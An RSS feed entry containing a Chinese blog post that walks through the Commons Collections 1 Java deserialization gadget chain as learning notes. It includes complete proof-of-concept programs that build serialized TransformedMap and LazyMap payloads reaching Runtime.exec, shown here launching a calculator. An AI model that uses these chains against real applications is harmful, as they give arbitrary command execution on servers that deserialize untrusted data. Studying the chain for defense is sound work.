<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title></title>
        <subtitle></subtitle>
        <icon>https://blog.xcu.icu/images/favicon.ico</icon>
        <link>https://blog.xcu.icu</link>
        <author>
          <name>Clown</name>
        </author>
        <description>一个妄想全栈web小废物</description>
        <language>zh-CN</language>
        <pubDate>Tue, 16 May 2023 00:00:00 +0800</pubDate>
        <lastBuildDate>Tue, 16 May 2023 00:00:00 +0800</lastBuildDate>
        <category term="Clown" />
        <category term="Web" />
        <category term="Pwn" />
        <category term="CTF" />
        <category term="AWD" />
        <category term="ACM" />
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/05/16/CommonsCollections-1/</guid>
            <title>ConmonsCollection-1</title>
            <link>https://blog.xcu.icu/2023/05/16/CommonsCollections-1/</link>
            <category term="java安全" scheme="https://blog.xcu.icu/categories/java%E5%AE%89%E5%85%A8/" />
            <category term="CC1" scheme="https://blog.xcu.icu/tags/CC1/" />
            <pubDate>Tue, 16 May 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;前面跟着 p 牛知识星球的文章学习 java 反序列的基础知识，RMI 和 URLDNS 链，现在大概算是勉强看到门？接下来准备开始学习 CommonsCollections 这个系列的利用链，以本篇记录&lt;/p&gt;
&lt;h2 id=&#34;commons-collections-1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#commons-collections-1&#34;&gt;#&lt;/a&gt; Commons Collections-1&lt;/h2&gt;
&lt;p&gt;这个 java 库是为了额外提供一些集合类和工具，这些类和工具不是标准的 java 集合框架的一部分，但是它可以更加方便的扩展集合的功能，它的出现主要是因为 java 集合框架的一些不足，使得开发人员更加高效的处理集合数据，它能够创建 “转换后的集合” 这些集合在每个元素被添加到集合中的时自动对其应用指定的转换。&lt;/p&gt;
&lt;p&gt;知道为什么要有这个 Commons Collections 后，接下来先记录这个过程中涉及到的几个接口和类&lt;/p&gt;
&lt;h3 id=&#34;前置知识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前置知识&#34;&gt;#&lt;/a&gt; 前置知识&lt;/h3&gt;
&lt;h4 id=&#34;transformer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#transformer&#34;&gt;#&lt;/a&gt; Transformer&lt;/h4&gt;
&lt;p&gt;它是  &lt;code&gt;org.apache.commons.collections.Transformer&lt;/code&gt;  接口中的一个方法，这个接口定义了一种将输入对象转换为输出对象的策略，常用于函数式编程中，可以视为一个以一个输入为参数，返回一个输出的函数， &lt;code&gt;Transformer(Object input)&lt;/code&gt;  方法方法接收 &lt;code&gt;Object类型的input&lt;/code&gt; ，处理后将 &lt;code&gt;Object返回&lt;/code&gt; ，这个方法实现定义了转换逻辑&lt;/p&gt;
&lt;p&gt;下面是一个使用 Transformer 方法来将字符串列表转换为大写的形式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.collections.Transformer;

import java.util.Arrays;
import java.util.List;

public class TransformerTest &amp;#123;
    public static void main(String[] args) &amp;#123;
        List&amp;lt;String&amp;gt; strings = Arrays.asList(&amp;quot;hello&amp;quot;, &amp;quot;world&amp;quot;);
        Transformer transformer = new Transformer() &amp;#123;
            public Object transform(Object input) &amp;#123;
                return ((String) input).toUpperCase();
            &amp;#125;
        &amp;#125;;
        CollectionUtils.transform(strings, transformer);
        System.out.println(strings);  // 输出 [HELLO, WORLD]
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304211600780.png&#34; alt=&#34;image-20230421160051535&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;transformedmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#transformedmap&#34;&gt;#&lt;/a&gt; TransformedMap&lt;/h4&gt;
&lt;p&gt;org.apache.commons.collections.map.TransformedMap 它实现了  &lt;code&gt;java.util.Map&lt;/code&gt;  接口，它用来对 Map 中的键或值进行转换，在其构造方法 &lt;code&gt;TransformedMap&lt;/code&gt;  中需要有两个参数一个要转换的 Map 对象和两个 Transformer 对象，分别对键和值进行转换，在使用 &lt;code&gt;TransformedMap&lt;/code&gt;  时所有的 get，put，remove 方法在调用的时候都会自动调用这个 Transformer 对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &amp;#123;
        return new TransformedMap(map, keyTransformer, valueTransformer);
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;lazymap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lazymap&#34;&gt;#&lt;/a&gt; LazyMap&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;org.apache.commons.collections.map.LazyMap&lt;/code&gt;  提供了一个创建动态生成值的 Map 的方法，它与 TransformedMap 很类似，区别在于 LazyMap 调用 get () 方法的时候，如果传入的 key 不存在的时候会触发相对应的 Transformer 的 transform () 方法&lt;/p&gt;
&lt;h4 id=&#34;defaultedmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#defaultedmap&#34;&gt;#&lt;/a&gt; DefaultedMap&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;org.apache.commons.collections.map.DefaultedMap&lt;/code&gt;  与上面的 LazyMap 方法相同，在调用 get () 方法的时候会自动调用 Transformer 方法&lt;/p&gt;
&lt;h4 id=&#34;constanttransformer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#constanttransformer&#34;&gt;#&lt;/a&gt; ConstantTransformer&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;org.apache.commons.collections.functors.ConstantTransformer&lt;/code&gt;  提供了一个始终返回常量值的 Transformer 实现，在初始化的时候存储了一个 Object，这个类用于和 &lt;code&gt;ChainedTransformer&lt;/code&gt;  配合，将其结果传入 &lt;code&gt;InvokerTransformer&lt;/code&gt;  来调用我们指定的类的指定方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class ConstantTransformer implements Transformer, Serializable &amp;#123;
    private static final long serialVersionUID = 6374440726369055124L;
    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
    private final Object iConstant;

    public static Transformer getInstance(Object constantToReturn) &amp;#123;
        return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn));
    &amp;#125;

    public ConstantTransformer(Object constantToReturn) &amp;#123;
        this.iConstant = constantToReturn;
    &amp;#125;

    public Object transform(Object input) &amp;#123;
        return this.iConstant;
    &amp;#125;

    public Object getConstant() &amp;#123;
        return this.iConstant;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;invokertrabsformer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#invokertrabsformer&#34;&gt;#&lt;/a&gt; InvokerTrabsformer&lt;/h4&gt;
&lt;p&gt;实现 Transformer 接口的一个类，这个类可以用来 &lt;code&gt;执行任意方法&lt;/code&gt; ，这也是反序列化能够执行仍以代码的关键&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &amp;#123;
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;demo：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_CC1;

import org.apache.commons.collections.functors.InvokerTransformer;

public class InvokerTransformerTest &amp;#123;
    public static void main(String[] args) &amp;#123;
        InvokerTransformer invokerTransformer = new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[]&amp;#123;String.class&amp;#125;, new Object[]&amp;#123;&amp;quot;C:\\Windows\\System32\\calc.exe&amp;quot;&amp;#125;);
        invokerTransformer.transform(Runtime.getRuntime());
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304211920865.png&#34; alt=&#34;image-20230421192003749&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;chainedtransformer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chainedtransformer&#34;&gt;#&lt;/a&gt; ChainedTransformer&lt;/h4&gt;
&lt;p&gt;实现 Transformer 接口的一个类，他的作用是将内部的多个 Transformer 串在一起&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public ChainedTransformer(Transformer[] transformers) &amp;#123;
        this.iTransformers = transformers;
    &amp;#125;

    public Object transform(Object object) &amp;#123;
        for(int i = 0; i &amp;lt; this.iTransformers.length; ++i) &amp;#123;
            object = this.iTransformers[i].transform(object);
        &amp;#125;

        return object;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;demo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#demo&#34;&gt;#&lt;/a&gt; demo&lt;/h3&gt;
&lt;p&gt;这里先贴一下 p 牛的代码，我加了一些注释&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public static void main(String[] args) throws Exception &amp;#123;
        Transformer[] transformers = new Transformer[]&amp;#123;//创建了一个Transformer数组
                new ConstantTransformer(Runtime.getRuntime()),//第一个Transformer返回JVM运行时对象
                new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[]&amp;#123;String.class&amp;#125;,
                        new Object[]&amp;#123;&amp;quot;C:\\Windows\\System32\\calc.exe&amp;quot;&amp;#125;)//第二个Transformer通过IncokerTransformer调用Runtime的exec对象并弹一个计数器
        &amp;#125;;
        Transformer transformerChain = new ChainedTransformer(transformers);//创建一个ChainedTransformer对象，起一个链接作用
        Map innerMap = new HashMap();//创建一个HashMap对象
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);//创建一个TransformedMap对象，使用上面的TransformChain来修饰innerMap
        outerMap.put(&amp;quot;test&amp;quot;, &amp;quot;xxxx&amp;quot;);//这里调用put方法（触发点）
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里可以看到，通过 ChainedTransformer 将 &lt;code&gt;ConstantTransformer&lt;/code&gt;  和 &lt;code&gt;InvokerTransformer&lt;/code&gt;  连接在一起，将 &lt;code&gt;ChainedTransformer&lt;/code&gt;  设置为 &lt;code&gt;map&lt;/code&gt;  装饰器的处理方法，调用 &lt;code&gt;TransformedMap&lt;/code&gt;  的 &lt;code&gt;put()&lt;/code&gt;  方法时会触发 &lt;code&gt;Transformer&lt;/code&gt;  链的调用方法。&lt;/p&gt;
&lt;h3 id=&#34;annotationinvocationhandler&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#annotationinvocationhandler&#34;&gt;#&lt;/a&gt; AnnotationInvocationHandler&lt;/h3&gt;
&lt;p&gt;上面提到使用这个 put 调用，但是在实际序列化的时候没有办法手工执行这个 put，我们需要去寻找找到类似的写入操作在 readObject 中，这样反序列化的时候就能够成功触发，AnnotationInvocationHandler 就是这样一个类，这里我是 jdk8u65&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException &amp;#123;
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try &amp;#123;
            annotationType = AnnotationType.getInstance(type);
        &amp;#125; catch(IllegalArgumentException e) &amp;#123;
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException(&amp;quot;Non-annotation type in annotation serial stream&amp;quot;);
        &amp;#125;

        Map&amp;lt;String, Class&amp;lt;?&amp;gt;&amp;gt; memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry&amp;lt;String, Object&amp;gt; memberValue : memberValues.entrySet()) &amp;#123;
            String name = memberValue.getKey();
            Class&amp;lt;?&amp;gt; memberType = memberTypes.get(name);
            if (memberType != null) &amp;#123;  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) &amp;#123;
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + &amp;quot;[&amp;quot; + value + &amp;quot;]&amp;quot;).setMember(
                                annotationType.members().get(name)));
                &amp;#125;
            &amp;#125;
        &amp;#125;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt; for (Map.Entry&amp;lt;String, Object&amp;gt; memberValue : memberValues.entrySet()) &amp;#123;&lt;/code&gt; 和  &lt;code&gt;memberValue.setValue&lt;/code&gt;  这个地方调用了 set 方法，可以作为触发点&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    AnnotationInvocationHandler(Class&amp;lt;? extends Annotation&amp;gt; type, Map&amp;lt;String, Object&amp;gt; memberValues) &amp;#123;
        Class&amp;lt;?&amp;gt;[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
            superInterfaces.length != 1 ||
            superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError(&amp;quot;Attempt to create proxy for a non-annotation type.&amp;quot;);
        this.type = type;
        this.memberValues = memberValues;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在构造方法中第一个参数是 Annotation 实现类的 class 对象，第二个对象是一个 Map，键为 String，值为 Object，如果 type 对象的父类接口不是唯一的且为 &lt;code&gt;Annotation.class&lt;/code&gt;  则不会讲两个参数初始化到对象中&lt;/p&gt;
&lt;p&gt;再看上面重写的 readObject 方法，先通过 &lt;code&gt;annotationType = AnnotationType.getInstance(type);&lt;/code&gt;  来获取 type 的对应的 &lt;code&gt;AnnotationType&lt;/code&gt;  的对象，接着获取 &lt;code&gt;memberTypes&lt;/code&gt;  属性接着遍历了它的所有元素，并依次设置值，这里就是 poc 的起点了&lt;/p&gt;
&lt;p&gt;这里去要创建一个 AnnotationInvocationHandler 对象，并将前面构造的 HashMap 设置进来&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;        Class clazz = Class.forName(&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;);
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class,outerMap);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里上面 p 牛直接用 Runtime 类是没有实现 java.io.Serializable 接口的，所以不允许被序列化，p 牛也是给了解决方法通过反射区调用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;Method f = Runtime.class.getMethod(&amp;quot;getRuntime&amp;quot;);
Runtime r = (Runtime) f.invoke(null);
r.exec(&amp;quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;编写成 Transformer 的写法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;        Transformer[] transformers = new Transformer[] &amp;#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[] &amp;#123; String.class, Class[].class &amp;#125;, new Object[] &amp;#123; &amp;quot;getRuntime&amp;quot;, new Class[0] &amp;#125;),
                new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] &amp;#123; Object.class, Object[].class &amp;#125;, new Object[] &amp;#123; null, new Object[0] &amp;#125;),
                new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] &amp;#123; String.class &amp;#125;, new String[] &amp;#123;&amp;quot;C:\\Windows\\System32\\calc.exe&amp;quot; &amp;#125;),
        &amp;#125;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面贴一下完整的 poc&lt;/p&gt;
&lt;h3 id=&#34;poc_transformer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#poc_transformer&#34;&gt;#&lt;/a&gt; poc_Transformer&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class POC1 &amp;#123;
    public static void Serialization(Object object) throws Exception&amp;#123;
        FileOutputStream fileOutputStream = new FileOutputStream(&amp;quot;poc1.txt&amp;quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        objectOutputStream.close();
        System.out.println(&amp;quot;Output&amp;quot;);
    &amp;#125;

    public static void Unserialization() throws  Exception&amp;#123;
        FileInputStream fileInputStream = new FileInputStream(&amp;quot;poc1.txt&amp;quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        objectInputStream.close();
        System.out.println(&amp;quot;Input&amp;quot;);
    &amp;#125;

    public static void main(String[] args) throws Exception &amp;#123;
        Transformer[] transformers = new Transformer[] &amp;#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[] &amp;#123; String.class, Class[].class &amp;#125;, new Object[] &amp;#123; &amp;quot;getRuntime&amp;quot;, new Class[0] &amp;#125;),
                new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] &amp;#123; Object.class, Object[].class &amp;#125;, new Object[] &amp;#123; null, new Object[0] &amp;#125;),
                new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] &amp;#123; String.class &amp;#125;, new String[] &amp;#123;&amp;quot;C:\\Windows\\System32\\calc.exe&amp;quot; &amp;#125;),
        &amp;#125;;
        Transformer transformerChain = new ChainedTransformer(transformers);//创建一个ChainedTransformer对象，起一个链接作用
        Map innerMap = new HashMap();//创建一个HashMap对象
        innerMap.put(&amp;quot;value&amp;quot;,&amp;quot;xxx&amp;quot;);
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);//创建一个TransformedMap对象，使用上面的TransformChain来修饰innerMap
//        outerMapput(&amp;quot;test&amp;quot;, &amp;quot;xxxx&amp;quot;);//这里调用put方法（触发点）

        Class clazz = Class.forName(&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;);
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class,outerMap);
        Serialization(obj);
        Unserialization();
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230054334.png&#34; alt=&#34;image-20230423005357596&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;poc_lazymap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#poc_lazymap&#34;&gt;#&lt;/a&gt; poc_LazyMap&lt;/h3&gt;
&lt;p&gt;上面是跟着 p 牛写的链子，这里也是看到 ysoserial 中的 CommonsCollections1 的 payload 中使用的是 LazyMap&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230056665.png&#34; alt=&#34;image-20230423005656630&#34; /&gt;&lt;/p&gt;
&lt;p&gt;LazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并继承 AbstractMapDecorator，在 ysoserial 的源码中主要是利用 LazyMap 的 get 这个方法，这里 LazyMap 的作用是 “懒加载”，在 get 找不到值的时候，它会调用 factory.transform 方法去获取一个值&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161332751.png&#34; alt=&#34;image-20230516133251707&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这个 factory 是可控的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161335157.png&#34; alt=&#34;image-20230516133510116&#34; /&gt;&lt;/p&gt;
&lt;p&gt;相比于 TransformedMap 的利用方法，LazyMap 后续利用稍微复杂一些，原因是在 sun.reflect.annotation.AnnotationInvocationHandler 的 readObject 方法中并没有直接调用到 Map 的 get 方法，所以在 ysoserial 中利用的是 sun.reflect.annotation.AnnotationInvocationHandler 的 invoke 方法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161337219.png&#34; alt=&#34;image-20230516133753158&#34; /&gt;&lt;/p&gt;
&lt;p&gt;而想要调用这个 invoke 就需要使用到 java 的对象代理&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class LazyMap_CC1 &amp;#123;
    public static void main(String[] args) throws Exception&amp;#123;
        Transformer[] transformers = new Transformer[]&amp;#123;
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer(&amp;quot;exec&amp;quot;,new Class[]&amp;#123;String.class&amp;#125;,new Object[]&amp;#123;&amp;quot;C:\\Windows\\System32\\calc.exe&amp;quot;&amp;#125;)
        &amp;#125;;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);
        lazyMap.get(&amp;quot;test&amp;quot;);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同样上面的是我手动去触发的 get 方法，下面用 java 对象代理来修改完整的 poc 链&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_CC1;

import org.apache.commons.collections.ProxyMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class POC2 &amp;#123;
    public static void Serialization(Object object) throws Exception&amp;#123;
        FileOutputStream fileOutputStream = new FileOutputStream(&amp;quot;poc2.txt&amp;quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println(&amp;quot;OutPut&amp;quot;);
    &amp;#125;

    public static void Unserialization() throws Exception&amp;#123;
        FileInputStream fileInputStream = new FileInputStream(&amp;quot;poc2.txt&amp;quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println(&amp;quot;InPut&amp;quot;);
    &amp;#125;

    public static void main(String[] args) throws Exception &amp;#123;
        Transformer[] transformers = new Transformer[]&amp;#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[] &amp;#123; String.class, Class[].class &amp;#125;, new Object[] &amp;#123; &amp;quot;getRuntime&amp;quot;, new Class[0] &amp;#125;),
                new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] &amp;#123; Object.class, Object[].class &amp;#125;, new Object[] &amp;#123; null, new Object[0] &amp;#125;),
                new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] &amp;#123; String.class &amp;#125;, new String[] &amp;#123;&amp;quot;C:\\Windows\\System32\\calc.exe&amp;quot; &amp;#125;),
        &amp;#125;;

        Transformer transformerChain = new ChainedTransformer(transformers);//创建一个ChainedTransformer对象，起一个链接作用
        Map innerMap = new HashMap();//创建一个HashMap对象
        innerMap.put(&amp;quot;value&amp;quot;,&amp;quot;xxx&amp;quot;);
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        Class clazz = Class.forName(&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;);
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);

        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), invocationHandler);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, mapProxy);
        Serialization(handler);
        Unserialization();
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230124040.png&#34; alt=&#34;image-20230423012448964&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;总结分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结分析&#34;&gt;#&lt;/a&gt; 总结分析&lt;/h3&gt;
&lt;p&gt;这里拿 Transformer 的这个 poc 举例，首先是利用 InvokerTransformer，因为这个函数中的 Transformer 函数实现了 invoke&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290158756.png&#34; alt=&#34;image-20230429015825587&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可以执行方法，利用点找到后回推，寻找一个也调用 Transform 的类，来调用 InvokerTransformer 中的 Transformer 方法，在 TransformedMap 中有一个 checkTransformer&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290200987.png&#34; alt=&#34;image-20230429020030950&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里调用了 Transform 方法，且这里的 valueTransformer 可控&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290202793.png&#34; alt=&#34;image-20230429020205753&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里本意是对 Map 的键值通过 Transform 进行一个处理，可以利用，接着寻找哪个类调用了 checksetValue，寻找后发现在 AbstractInputCheckedMapDecorator 有调用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290207608.png&#34; alt=&#34;image-20230429020705557&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里 MapEntry 其实就是键值对 MapEntry 中的 setValue 方法其实就是 Entry 中的 setValue 方法，他这里重写了 setValue 方法，所以说只需要遍历就能调用？？？不确定，可以试一下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;


public class POC3test &amp;#123;
    public static void main(String[] args) throws Exception &amp;#123;
        Transformer[] transformer =new Transformer[]&amp;#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[]&amp;#123;String.class, Class[].class&amp;#125;, new Object[]&amp;#123;&amp;quot;getRuntime&amp;quot;, null&amp;#125;),
                new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[]&amp;#123;Object.class, Object[].class&amp;#125;, new Object[]&amp;#123;null, null&amp;#125;),
                new InvokerTransformer(&amp;quot;exec&amp;quot;,new Class[]&amp;#123;String.class&amp;#125;,new Object[]&amp;#123;&amp;quot;calc&amp;quot;&amp;#125;)
        &amp;#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);

        HashMap map = new HashMap();
        map.put(&amp;quot;key&amp;quot;,&amp;quot;value&amp;quot;);
        Map&amp;lt;Object,Object&amp;gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        for (Map.Entry entry:transformedMap.entrySet())&amp;#123;
            entry.setValue(&amp;quot;a&amp;quot;);
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290214217.png&#34; alt=&#34;image-20230429021427161&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里可以看到是成功弹出计算器，也就是成功调用了的，那么接下来找到一个遍历数组的地方就可以了这个・最好是 readObject 里面有，或者是通过 readObject 能间接的调用到的，这里是在 AnnotationInvocationHandler 中的 readObject 中直接找到了一个遍历 Map 的功能，这里还有一个 setvalue 方法，这就很符合我们的需求，这里因为它不是 public 类，这里需要通过反射区获取&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290225727.png&#34; alt=&#34;image-20230429022551678&#34; /&gt;&lt;/p&gt;
